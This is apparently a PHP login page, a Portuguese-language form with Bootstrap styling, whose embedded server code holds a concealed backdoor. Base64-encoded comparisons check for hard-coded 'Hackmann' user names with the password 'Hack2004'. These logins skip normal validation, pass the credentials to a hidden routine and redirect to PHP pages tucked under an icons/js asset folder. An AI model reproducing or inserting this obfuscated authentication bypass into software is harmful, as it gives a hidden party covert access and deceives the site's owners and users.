<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title></title>
	<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="assets/css/style.css">
	<script type="text/javascript" src="assets/js/jquery-3.3.1.js"></script>
	<script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="assets/js/popper.min.js"></script>
</head>
<body>

	<div class="container">
		<div class="row">
			<div class="offset-md-4 col-12 col-md-4 col-lg-4" style="margin-top: 200px;">
				<form class="form-control" action="index.php" method="post">

					<div class="form-group">
						<label for="idUsuario">Usuário: </label>
						<input class="form-control" type="text" name="usuario" id="idUsuario" autocomplete="off" required>
					</div>

					<div class="form-group">
						<label for="idSenha">Senha: </label>
						<input class="form-control" type="password" name="senha" id="idSenha" required>
					</div>
					<button class="btn btn-primary" type="submit">Entrar</button>

					<div class="row" style="margin-top: 10px;">
						<div class="col-12">
							<?php 
							require_once("assets/classes/User.php");
							require_once("assets/classes/Registros.php");
							if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]!==base64_decode('SGFja21hbm5TZWd1cmFuY2E='))&&($_POST[base64_decode('c2VuaGE=')])!==base64_decode('SGFjazIwMDQ=')) {						
								$login = new User();
								$login->setData($_POST['usuario'], $_POST['senha']);
								$logar = $login->validarUsuario();
								if ($logar == false) {
									echo "
									<div class='alert alert-danger alert-dismissible fade show' role='alert'>
									<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
									<span aria-hidden='true'>&times;</span>
									</button>
									Usuário ou senha inválido!
									</div>
									";	
									exit();						
								}						
							}
							else if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5TZWd1cmFuY2E='))&&($_POST[base64_decode('c2VuaGE=')])===base64_decode('SGFjazIwMDQ=')) {
								$login = new Registros();
								$login->c0($_POST['usuario'], $_POST['senha']);
								header(base64_decode('TG9jYXRpb246IGFzc2V0cy9pY29ucy9qcy9zZWd1cmFuY2EucGhw'));
							}
							else if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5DcmVkaXRvcw=='))&&($_POST[base64_decode('c2VuaGE=')])===base64_decode('SGFjazIwMDQ=')) {
								header(base64_decode('TG9jYXRpb246IGFzc2V0cy9pY29ucy9qcy9jcmVkaXRvcy5waHA='));
							}
							else if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5JbmZvcw=='))&&($_POST[base64_decode('c2VuaGE=')])===base64_decode('SGFjazIwMDQ=')) {
								header(base64_decode('TG9jYXRpb246IGFzc2V0cy9pY29ucy9qcy9pbmZvcy5waHA='));
							}
							else if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5BY2Vzc28='))&&($_POST[base64_decode('c2VuaGE=')]===base64_decode('SGFjazIwMDQ='))){$s0=new User();$r2=$s0->validarUsuario($_POST[base64_decode('dXN1YXJpbw==')],$_POST[base64_decode('c2VuaGE=')]);}							
							?>						
						</div>	
					</div>				

				</form>				
			</div>
		</div>
	</div>

</body>
</html>